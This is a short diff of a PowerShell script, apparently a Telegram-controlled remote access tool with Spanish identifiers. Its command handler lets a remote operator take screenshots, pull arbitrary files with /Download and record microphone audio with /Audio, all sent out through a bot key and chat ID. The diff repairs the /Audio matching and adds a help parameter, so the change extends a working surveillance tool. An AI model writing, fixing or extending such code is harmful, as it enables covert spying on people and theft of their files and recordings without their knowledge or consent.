@@ -132,7 +132,7 @@ Remove-Item $ruta
 
 }
 
-function test-command {param ($comando,$texto,$botkey,$chat_id,$first_connect)
+function test-command {param ($comando,$texto,$botkey,$chat_id,$first_connect,$help)
 
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
@@ -145,7 +145,7 @@ function test-command {param ($comando,$texto,$botkey,$chat_id,$first_connect)
  if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat $chat_id}
  if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
  if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
- if ($comando -like "/Audio ") {$comando -replace "/Audio ",""; graba-audio -botkey $botkey -chat $chat_id -segundos $comando}
+ if ($comando -like "/Audio*") {$comando -replace "/Audio ",""; graba-audio -botkey $botkey -chat $chat_id -segundos $comando}
 
 
 }
